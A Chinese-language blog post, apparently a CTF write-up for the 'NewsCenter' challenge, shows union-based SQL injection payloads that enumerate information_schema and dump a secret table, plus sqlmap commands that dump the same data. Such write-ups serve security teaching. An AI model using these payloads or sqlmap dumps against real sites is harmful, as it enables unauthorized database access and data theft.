@@ -1,0 +1,94 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>攻防世界-NewsCenter | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>攻防世界-NewsCenter</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-08-06T10:46:24.498Z" id="date"> 2023-08-06</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-08-06T11:29:54.469Z" id="updated"> 2023-08-06</time></div></span><br><span>文章总字数: <div class="control">638</div></span><br><span>预计阅读时间: <div class="control">2 分钟</div></span></div></div><hr><div id="post-content"><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2>
+<p>无</p>
+<h2 id="题目解题："><a href="#题目解题：" class="headerlink" title="题目解题："></a>题目解题：</h2>
+<h3 id="方法一：手工注入"><a href="#方法一：手工注入" class="headerlink" title="方法一：手工注入"></a>方法一：手工注入</h3>
+<p>这里环境出了问题，怎么刷新也显示不了，就跟着wp走一遍吧</p>
+<p>点进去看到如下页面</p>
+<p class='item-img' data-src='image-20230806192255610.png'><img src="image-20230806192255610.png" alt="image-20230806192255610"></p>
+<p>毕竟已经知道是sql注入了，直接看wp分析吧：</p>
+<p>看到数据包最下方有个POST提交的 search =1，看到这里不知道大家想到了什么没有<br>
+(我第一时间是想到了sql注入)<br>
+于是我去尝试，因为search框是能输入字符的所以应该先想他为字符型注入，我比较习惯于用 order by 去判断是否有sql注入<br>
+于是在这里构造search=1’ order by 3 --+，burp suite里发送给repeater</p>
+<p class='item-img' data-src='image-20230806192426642.png'><img src="image-20230806192426642.png" alt="image-20230806192426642"></p>
+<p>再尝试search=1’ order by 4 --+</p>
+<p class='item-img' data-src='image-20230806192436141.png'><img src="image-20230806192436141.png" alt="image-20230806192436141"></p>
+<p>非常好出现错误了，接下来是利用sql注入的联合查询<br>
+<code> search=-1’ union select 1,2,3 --+</code>  //这里-1是为了不占用回显位</p>
+<p class='item-img' data-src='image-20230806192502011.png'><img src="image-20230806192502011.png" alt="image-20230806192502011"></p>
+<p>判断回显位为2,3<br>
+然后search=-1’ union select 1,version(),database() --+<br>
+获取sql版本和当前数据库名</p>
+<p class='item-img' data-src='image-20230806192538245.png'><img src="image-20230806192538245.png" alt="image-20230806192538245"></p>
+<p>这里为什么要获取数据库版本呢因为mysql大于5.0以上的版本有一个<br>
+系统数据库information_schema里面的tables表和columns表包含了其他所有的表和列这样我们就可以有据查询<br>
+并且这里知道了当前数据库为news<br>
+然后再构造sql语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">search=-1’ union select 1,version(),group_concat(table_name) from information_schema.tables where table_schema=‘news’ --+<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230806192605815.png'><img src="image-20230806192605815.png" alt="image-20230806192605815"></p>
+<p>这里可以看到有两个表news，和secret_table，news应该就是页面上的那些所以我们去找flag要从secret_table表中去找<br>
+再构造sql语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">search=-1’ union select 1,version(),group_concat(column_name) from information_schema.columns where table_name=‘secret_table’ --+<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230806192628428.png'><img src="image-20230806192628428.png" alt="image-20230806192628428"></p>
+<p>看到有两个列id,fl4g答案应该就在fl4g里面了<br>
+最后的sql语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">search=-1’ union select 1,version(),group_concat(fl4g) from secret_table --+<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230806192652378.png'><img src="image-20230806192652378.png" alt="image-20230806192652378"></p>
+<h3 id="方法二：sqlmap"><a href="#方法二：sqlmap" class="headerlink" title="方法二：sqlmap"></a>方法二：sqlmap</h3>
+<p>搜索框中填入内容，如‘1’，回车搜索抓包，将抓到包的内容保存在txt文档里</p>
+<p class='item-img' data-src='image-20230806192821010.png'><img src="image-20230806192821010.png" alt="image-20230806192821010"></p>
+<p>使用sqlmap的-r进行注入如下，其中C:\Users\xxx\Desktop\1.txt为保存数据包的txt文件绝对路径</p>
+<p>#查找数据库<br>
+<a target="_blank" rel="noopener" href="http://sqlmap.py">sqlmap.py</a> -r “C:\Users\xxx\Desktop\1.txt” --dbs</p>
+<p>#或查找当前数据库<br>
+<a target="_blank" rel="noopener" href="http://sqlmap.py">sqlmap.py</a> -r “C:\Users\xxx\Desktop\1.txt” --current-dbs</p>
+<p class='item-img' data-src='image-20230806192839665.png'><img src="image-20230806192839665.png" alt="image-20230806192839665"></p>
+<p>#查找news数据库中的表<br>
+<a target="_blank" rel="noopener" href="http://sqlmap.py">sqlmap.py</a> -r “C:\Users\xxx\Desktop\1.txt” -D news --tables</p>
+<p class='item-img' data-src='image-20230806192851775.png'><img src="image-20230806192851775.png" alt="image-20230806192851775"></p>
+<p>#查找secret_table表中的列<br>
+<a target="_blank" rel="noopener" href="http://sqlmap.py">sqlmap.py</a> -r “C:\Users\xxx\Desktop\1.txt” -D news -T serect_table --columns</p>
+<p class='item-img' data-src='image-20230806192900777.png'><img src="image-20230806192900777.png" alt="image-20230806192900777"></p>
+<p>#查找fl4g列中的字段（内容），出现flag<br>
+<a target="_blank" rel="noopener" href="http://sqlmap.py">sqlmap.py</a> -r “C:\Users\xxx\Desktop\1.txt” -D news -T serect_table -C fl4g --dump</p>
+<p class='item-img' data-src='image-20230806192909863.png'><img src="image-20230806192909863.png" alt="image-20230806192909863"></p>
+<p>怎么说，没有过滤，很新手</p>
+<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/trytowritecode/article/details/120709275?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169131919616800215026970%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169131919616800215026970&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-3-120709275-null-null.142%5Ev92%5EchatgptT0_1&amp;utm_term=NewsCenter&amp;spm=1018.2226.3001.4187">方法一参考</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62619559/article/details/121256876?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=NewsCenter%E7%8E%AF%E5%A2%83%E6%8A%A5%E9%94%99&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-121256876.142%5Ev92%5EchatgptT0_1&amp;spm=1018.2226.3001.4187">方法二参考</a></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/08/06/%E6%B5%85%E6%9E%90SSTI%E6%BC%8F%E6%B4%9E/">浅析SSTI漏洞 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">题目描述：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E9%A2%98%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">题目解题：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">方法一：手工注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Asqlmap"><span class="toc-number">2.2.</span> <span class="toc-text">方法二：sqlmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">参考文章：</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+window.waline = init;
+</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
+ waline({
+   el: '#waline',
+   dark: ':root[theme-mode="dark"]',
+   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
+   path: window.location.pathname,
+ });document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
